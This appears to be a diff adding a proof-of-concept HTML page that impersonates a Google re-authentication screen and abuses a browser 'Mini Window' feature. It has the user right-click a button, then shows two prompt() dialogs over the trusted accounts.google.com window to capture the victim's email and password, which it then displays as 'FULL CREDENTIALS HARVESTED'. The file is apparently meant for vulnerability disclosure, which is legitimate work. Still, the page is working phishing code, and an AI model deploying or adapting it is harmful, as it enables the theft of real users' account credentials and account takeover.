@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Google Account - Session Verification</title>
+    <style>
+        body {
+            font-family: 'Google Sans', -apple-system, BlinkMacSystemFont, sans-serif;
+            background-color: #f8f9fa;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
+            max-width: 460px;
+            text-align: center;
+        }
+        .logo { width: 90px; margin-bottom: 20px; }
+        h2 { color: #202124; font-weight: 400; font-size: 22px; margin-bottom: 8px; }
+        p { color: #5f6368; line-height: 1.6; margin-bottom: 25px; font-size: 14px; }
+        .btn {
+            background-color: #1a73e8;
+            color: white;
+            padding: 10px 24px;
+            border-radius: 4px;
+            text-decoration: none;
+            display: inline-block;
+            font-weight: 500;
+            cursor: context-menu;
+            border: none;
+            font-size: 14px;
+        }
+        #log {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 4px;
+            display: none;
+            text-align: left;
+            font-size: 13px;
+        }
+        .success { background: #fce4ec; border: 1px solid #e53935; color: #b71c1c; }
+        .fail { background: #fff3cd; border: 1px solid #ffeeba; color: #856404; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" class="logo">
+    <h2>Re-authenticate Session</h2>
+    <p>
+        Your Google session has expired due to a security policy update. 
+        Right-click the button below and select <b>"Open in Mini Window"</b> 
+        to re-verify your identity.
+    </p>
+    
+    <a id="prompt-trigger" class="btn" href="https://accounts.google.com">
+        Verify Identity
+    </a>
+
+    <div id="log"></div>
+</div>
+
+<script>
+    const trigger = document.getElementById('prompt-trigger');
+    const log = document.getElementById('log');
+
+    trigger.addEventListener('contextmenu', () => {
+        console.log("[PoC] Right-click detected. Waiting for Mini Window to open...");
+
+        setTimeout(() => {
+            console.log("[PoC] Launching 2-step credential harvesting...");
+
+            // STEP 1: Ask for email (mimics Google's 2-step login flow)
+            const stolenEmail = prompt(
+                "Google Security\n\n" +
+                "Your session has expired. To continue, please verify your Google account.\n\n" +
+                "Enter your email address:"
+            );
+
+            if (!stolenEmail || stolenEmail.length === 0) {
+                log.style.display = 'block';
+                log.className = 'fail';
+                log.innerHTML = `<b>Cancelled:</b> User dismissed at Step 1 (email).`;
+                return;
+            }
+
+            // STEP 2: Ask for password (appears immediately after, just like real Google login)
+            const stolenPassword = prompt(
+                "Google Security\n\n" +
+                "Welcome back, " + stolenEmail + "\n\n" +
+                "Enter your password:"
+            );
+
+            if (!stolenPassword || stolenPassword.length === 0) {
+                log.style.display = 'block';
+                log.className = 'fail';
+                log.innerHTML = `<b>Partial capture:</b> Email harvested (<code>${stolenEmail}</code>) but user dismissed at Step 2 (password).`;
+                return;
+            }
+
+            // BOTH credentials captured
+            log.style.display = 'block';
+            log.className = 'success';
+            log.innerHTML = `
+                <b>🚨 FULL CREDENTIALS HARVESTED</b><br><br>
+                <b>Email:</b> <code>${stolenEmail}</code><br>
+                <b>Password:</b> <code>${stolenPassword}</code><br><br>
+                <b>Attack chain:</b><br>
+                • Mini Window displayed <code>accounts.google.com</code> (trusted login page)<br>
+                • Two sequential <code>prompt()</code> dialogs appeared ON TOP of Mini Window<br>
+                • The 2-step flow perfectly mimics Google's real login process<br>
+                • Both email and password captured by the malicious background page<br><br>
+                <b>Impact:</b> Full account takeover — attacker now has the victim's complete Google credentials.
+            `;
+            console.log("[PoC] FULL HARVEST:", stolenEmail, stolenPassword);
+
+        }, 3500);
+    });
+</script>
+
+</body>
+</html>
